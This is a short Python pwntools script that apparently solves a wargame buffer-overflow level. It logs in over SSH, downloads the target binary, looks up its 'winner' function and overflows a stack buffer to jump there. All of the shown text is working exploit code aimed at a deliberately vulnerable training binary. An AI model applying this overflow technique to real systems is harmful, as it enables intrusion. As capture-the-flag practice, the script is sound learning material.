from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
winner_addr = e.symbols['winner']
log.info('winner_addr: %08x', winner_addr)

payload = fit({64+4+4: p32(winner_addr)})
with s.system([args.BIN, payload]) as p:
    p.recvline()
    ret = p.recvline()
    assert ret == 'level passed\n'
